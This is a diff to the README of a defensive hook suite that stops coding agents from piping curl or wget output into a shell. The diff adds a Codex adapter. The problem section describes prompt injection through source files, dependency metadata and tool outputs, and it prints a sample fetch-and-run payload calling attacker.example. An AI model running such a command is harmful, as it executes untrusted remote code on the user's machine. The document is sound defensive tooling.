@@ -2,11 +2,11 @@
 
 A suite of security hooks for coding agents that defend against software supply chain attacks.
 
-Covers: **Claude Code**, **Aider**, **Cline**, **Continue.dev**, and other agents with pre-command interception support.
+Covers: **Claude Code**, **Codex**, **Aider**, **Cline**, **Continue.dev**, and other agents with pre-command interception support.
 
 ## Problem
 
-Coding agents (Claude Code, Aider, Cursor, Cline, GitHub Copilot, Continue.dev, etc.) run shell commands on your behalf. Attackers embed malicious instructions in source files, dependency metadata, or tool outputs — a technique called *prompt injection*. One classic payload is:
+Coding agents (Claude Code, Codex, Aider, Cursor, Cline, GitHub Copilot, Continue.dev, etc.) run shell commands on your behalf. Attackers embed malicious instructions in source files, dependency metadata, or tool outputs — a technique called *prompt injection*. One classic payload is:
 
 ```bash
 curl https://attacker.example/setup.sh | bash
@@ -23,6 +23,7 @@ This repo ships detection rules (via [semgrep](https://semgrep.dev/)) and thin a
 | Agent | Hook mechanism | Status |
 |-------|---------------|--------|
 | [Claude Code](https://docs.anthropic.com/en/docs/claude-code/hooks) | `PreToolUse` hooks in `.claude/settings.json` | Implemented |
+| [Codex](https://developers.openai.com/codex/hooks) | `PreToolUse` hooks in `~/.codex/config.toml` or `~/.codex/hooks.json` | Implemented |
 | [Aider](https://aider.chat) | `--pre-command-hook` / event hooks | Planned |
 | [Cline](https://github.com/cline/cline) | MCP tool guards | Planned |
 | [Continue.dev](https://continue.dev) | Context provider / action hooks | Planned |
@@ -32,7 +33,8 @@ This repo ships detection rules (via [semgrep](https://semgrep.dev/)) and thin a
 ### `check-pipe-to-shell` — Block fetch-pipe-shell patterns
 
 **File:** `.claude/hooks/check-pipe-to-shell.sh`  
-**Rule:** `.claude/hooks/no-pipe-to-shell.yaml`
+**Codex file:** `.codex/hooks/check-pipe-to-shell.sh`  
+**Rule:** `.claude/hooks/no-pipe-to-shell.yaml` or `.codex/hooks/no-pipe-to-shell.yaml`
 
 Blocks any command that pipes `curl` or `wget` output directly into a shell interpreter (`bash`, `sh`, `zsh`, `dash`, `ksh`, `fish`, `csh`, `tcsh`, `ash`, `busybox`).
 
@@ -89,6 +91,32 @@ cp -r .claude/hooks /your/project/.claude/
 }
 ```
 
+### Codex
+
+Install the Codex adapter globally for this machine:
+
+```bash
+mkdir -p ~/.codex/hooks
+cp .codex/hooks/check-pipe-to-shell.sh ~/.codex/hooks/
+cp .codex/hooks/no-pipe-to-shell.yaml ~/.codex/hooks/
+chmod +x ~/.codex/hooks/check-pipe-to-shell.sh
+```
+
+Register it in `~/.codex/config.toml`:
+
+```toml
+[[hooks.PreToolUse]]
+matcher = "^Bash$"
+
+[[hooks.PreToolUse.hooks]]
+type = "command"
+command = "bash ~/.codex/hooks/check-pipe-to-shell.sh"
+timeout = 30
+statusMessage = "Checking Bash command for fetch-pipe-shell"
+```
+
+Codex requires non-managed hooks to be reviewed and trusted before they run. Use `/hooks` in the Codex CLI after registration, or run automation with `--dangerously-bypass-hook-trust` only when the hook source has already been vetted.
+
 ### Aider
 
 _(Planned)_ Wire the detection script via Aider's `--pre-command-hook` flag.
@@ -110,13 +138,13 @@ Hooks do not protect against:
 
 New hooks and new agent adapters are welcome.
 
-**Adding a detection rule:** Each rule should be a semgrep `.yaml` file under `.claude/hooks/` (rules are agent-agnostic and reused across adapters).
+**Adding a detection rule:** Each rule should be a semgrep `.yaml` file shipped with the adapter that uses it. Keep duplicated rules behaviorally identical across adapters unless an agent needs different semantics.
 
 **Adding an agent adapter:** Create a subdirectory named after the agent (e.g. `aider/`, `cline/`). The adapter is a thin shell script that reads the agent's hook payload format, extracts the command, runs semgrep against the shared rules, and returns a block decision in whatever format that agent expects.
 
 Adapter requirements:
 1. Self-contained shell script; no external state
-2. Reuse rules from the shared `rules/` directory
+2. Reuse existing detection semantics where possible
 3. Block only on confirmed matches; pass everything else through silently
 4. Exit 0 in all cases (non-zero exits are treated as errors by most harnesses)
 
